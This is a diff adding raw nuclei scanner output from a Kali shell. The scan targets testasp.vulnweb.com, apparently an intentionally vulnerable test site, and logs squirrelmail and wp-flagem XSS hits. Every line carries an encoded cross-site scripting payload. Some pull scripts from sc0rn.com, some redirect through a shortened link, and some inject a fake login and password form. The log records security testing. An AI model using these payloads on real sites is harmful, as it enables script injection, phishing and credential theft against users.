@@ -1,0 +1,47 @@
+
+╭─      /home/j/HackerOne/program_bash/Recon_sub/testphp.vulnweb.com ▓▒░    ░▒▓ ✔  with root@kali  at 16:30:11   
+╰─ cat history_url.txt | anew | nuclei -t /root/nuclei-templates/vulnerabilities 
+
+                     __     _
+   ____  __  _______/ /__  (_)
+  / __ \/ / / / ___/ / _ \/ /
+ / / / / /_/ / /__/ /  __/ /
+/_/ /_/\__,_/\___/_/\___/_/   2.7.4
+
+                projectdiscovery.io
+
+[WRN] Use with caution. You are responsible for your actions.
+[WRN] Developers assume no liability and are not responsible for any misuse or damage.
+[WRN] Found 2 templates with runtime error (use -validate flag for further examination)
+[INF] Using Nuclei Engine 2.7.4 (outdated)
+[INF] Using Nuclei Templates 9.3.1 (latest)
+[INF] Templates added in last update: 2
+[INF] Templates loaded for scan: 455
+[INF] Templates clustered: 12 (Reduced 47607 HTTP Requests)
+[INF] Using Interactsh Server: oast.fun
+[2022-12-11 16:34:15] [squirrelmail-address-xss] [http] [medium] http://testasp.vulnweb.com/Search.asp?tfSearch=/plugins/address_add/add.php?first=HOVER%20ME!%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+[2022-12-11 16:34:15] [squirrelmail-address-xss] [http] [medium] http://testasp.vulnweb.com/Search.asp?tfSearch=%253/plugins/address_add/add.php?first=HOVER%20ME!%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+[2022-12-11 16:34:19] [squirrelmail-address-xss] [http] [medium] http://testasp.vulnweb.com/Search.asp?tfSearch=%3Cbr%3E%3Cbr%3EPlease+login+with+the+form+below+before+proceeding%3A%3C%20form+action%3D%22test.asp%22%3E%3Ctable%3E%3Ctr%3E%3Ctd%3ELogin%3A%3C%2Ftd%3E%3Ctd%3E%3Cinput+type%3Dtext+%20length%3D20+name%3Dlogin%3E%3C%2Ftd%3E%3C%2Ftr%3E%3Ctr%3E%3Ctd%3EPassword%3A%3C%2Ftd%3E%3Ctd%3E%3Cinput%20+type%3Dtext+length%3D20+name%3Dpassword%3E%3C%2Ftd%3E%3C%2Ftr%3E%3C%2Ftable%3E%3Cinput+type%3Dsubmit+value%20%3DLOGIN%3E%3C%2Fform%3E/plugins/address_add/add.php?first=HOVER%20ME!%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+[2022-12-11 16:34:21] [squirrelmail-address-xss] [http] [medium] http://testasp.vulnweb.com/Search.asp?tfSearch=%3Cscript%20src=%22http://sc0rn.com/sc.js%22%3E%3C%2Fscript%3E/plugins/address_add/add.php?first=HOVER%20ME!%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+[2022-12-11 16:34:22] [squirrelmail-address-xss] [http] [medium] http://testasp.vulnweb.com/Search.asp?tfSearch=%3Cbr%3E%3Cbr%3EPlease+login+with+/plugins/address_add/add.php?first=HOVER%20ME!%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+[2022-12-11 16:34:24] [squirrelmail-address-xss] [http] [medium] http://testasp.vulnweb.com/Search.asp?tfSearch==%3Cscript%3Elocation.href=%22http://goo.gl/z4LTEG%22;%3C%2Fscript%3E/plugins/address_add/add.php?first=HOVER%20ME!%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+[2022-12-11 16:34:24] [squirrelmail-address-xss] [http] [medium] http://testasp.vulnweb.com/Search.asp?tfSearch=%25u003C%25s%25v%25g%25%20%25o%25n%25l%25o%25a%25d%25%25u003D%25a%25l%25e%25r%25t%25(%251%25)%25%3E/plugins/address_add/add.php?first=HOVER%20ME!%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+[2022-12-11 16:34:26] [squirrelmail-address-xss] [http] [medium] http://testasp.vulnweb.com/Search.asp?tfSearch=Mert/plugins/address_add/add.php?first=HOVER%20ME!%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+[2022-12-11 16:34:29] [squirrelmail-address-xss] [http] [medium] http://testasp.vulnweb.com/Search.asp?tfSearch=%3Cscript%20src=%22http://sc0rn.com/nip.js%22%3E%3C%2Fscript%3E/plugins/address_add/add.php?first=HOVER%20ME!%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+[2022-12-11 16:34:29] [squirrelmail-address-xss] [http] [medium] http://testasp.vulnweb.com/search.asp?tfSearch=%3Cscript%3Ealert(1)&tfSearch=alert(2)%3C/script%3E/plugins/address_add/add.php?first=HOVER%20ME!%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+[2022-12-11 16:34:30] [squirrelmail-address-xss] [http] [medium] http://testasp.vulnweb.com/search.asp?tfSearch=%3Cscript%3Ealert(1);%20var%20x=[''&tfSearch=''];%3C/script%3E/plugins/address_add/add.php?first=HOVER%20ME!%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+[2022-12-11 16:47:10] [wp-flagem-xss] [http] [medium] http://testasp.vulnweb.com/Search.asp?tfSearch=/wp-content/plugins/FlagEm/flagit.php?cID=%22%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+[2022-12-11 16:47:10] [wp-flagem-xss] [http] [medium] http://testasp.vulnweb.com/Search.asp?tfSearch=%253/wp-content/plugins/FlagEm/flagit.php?cID=%22%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+[2022-12-11 16:47:11] [wp-flagem-xss] [http] [medium] http://testasp.vulnweb.com/Search.asp?tfSearch=%25u003C%25s%25v%25g%25%20%25o%25n%25l%25o%25a%25d%25%25u003D%25a%25l%25e%25r%25t%25(%251%25)%25%3E/wp-content/plugins/FlagEm/flagit.php?cID=%22%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+[2022-12-11 16:47:11] [wp-flagem-xss] [http] [medium] http://testasp.vulnweb.com/Search.asp?tfSearch=%3Cbr%3E%3Cbr%3EPlease+login+with+the+form+below+before+proceeding%3A%3Cform+action%3D%22test.asp%22%3E%3Ctable%3E%3Ctr%3E%3Ctd%3ELogin%3A%3C%2F/wp-content/plugins/FlagEm/flagit.php?cID=%22%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+[2022-12-11 16:47:11] [wp-flagem-xss] [http] [medium] http://testasp.vulnweb.com/Search.asp?tfSearch==%3Cscript%3Elocation.href=%22http://goo.gl/z4LTEG%22;%3C%2Fscript%3E/wp-content/plugins/FlagEm/flagit.php?cID=%22%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+[2022-12-11 16:47:11] [wp-flagem-xss] [http] [medium] http://testasp.vulnweb.com/Search.asp?tfSearch=%3Cbr%3E%3Cbr%3EPlease+login+with+/wp-content/plugins/FlagEm/flagit.php?cID=%22%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+[2022-12-11 16:47:11] [wp-flagem-xss] [http] [medium] http://testasp.vulnweb.com/Search.asp?tfSearch=%3Cscript%20src=%22http://sc0rn.com/nip.js%22%3E%3C%2Fscript%3E/wp-content/plugins/FlagEm/flagit.php?cID=%22%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+[2022-12-11 16:47:12] [wp-flagem-xss] [http] [medium] http://testasp.vulnweb.com/Search.asp?tfSearch=%3Cscript%20src=%22http://sc0rn.com/cfy.js%22%3E%3C%2Fscript%3E/wp-content/plugins/FlagEm/flagit.php?cID=%22%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+[2022-12-11 16:47:12] [wp-flagem-xss] [http] [medium] http://testasp.vulnweb.com/Search.asp?tfSearch=%3Cbr%3E%3Cbr%3EPlease+login+with+the+form+below+before+proceeding%3A%3C%20form+action%3D%22test.asp%22%3E%3Ctable%3E%3Ctr%3E%3Ctd%3ELogin%3A%3C%2Ftd%3E%3Ctd%3E%3Cinput+type%3Dtext+%20length%3D20+name%3Dlogin%3E%3C%2Ftd%3E%3C%2Ftr%3E%3Ctr%3E%3Ctd%3EPassword%3A%3C%2Ftd%3E%3Ctd%3E%3Cinput%20+type%3Dtext+length%3D20+name%3Dpassword%3E%3C%2Ftd%3E%3C%2Ftr%3E%3C%2Ftable%3E%3Cinput+type%3Dsubmit+value%20%3DLOGIN%3E%3C%2Fform%3E/wp-content/plugins/FlagEm/flagit.php?cID=%22%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+[2022-12-11 16:47:12] [wp-flagem-xss] [http] [medium] http://testasp.vulnweb.com/Search.asp?tfSearch=%3Cscript%20src=%22http://sc0rn.com/sc.js%22%3E%3C%2Fscript%3E/wp-content/plugins/FlagEm/flagit.php?cID=%22%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+[2022-12-11 16:47:13] [wp-flagem-xss] [http] [medium] http://testasp.vulnweb.com/Search.asp?tfSearch=Mert/wp-content/plugins/FlagEm/flagit.php?cID=%22%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+[2022-12-11 16:47:15] [wp-flagem-xss] [http] [medium] http://testasp.vulnweb.com/search.asp?tfSearch=%3Cscript%3Ealert(1)&tfSearch=alert(2)%3C/script%3E/wp-content/plugins/FlagEm/flagit.php?cID=%22%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+[2022-12-11 16:47:15] [wp-flagem-xss] [http] [medium] http://testasp.vulnweb.com/search.asp?tfSearch=%3Cscript%3Ealert(1);%20//&tfSearch=%3C/script%3E/wp-content/plugins/FlagEm/flagit.php?cID=%22%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+[2022-12-11 16:47:15] [wp-flagem-xss] [http] [medium] http://testasp.vulnweb.com/Search.asp?tfSearch=MertXSS/wp-content/plugins/FlagEm/flagit.php?cID=%22%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+[2022-12-11 16:47:18] [wp-flagem-xss] [http] [medium] http://testasp.vulnweb.com/search.asp?tfSearch=%3Cscript%3Ealert(1);%20var%20x=[''&tfSearch=''];%3C/script%3E/wp-content/plugins/FlagEm/flagit.php?cID=%22%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
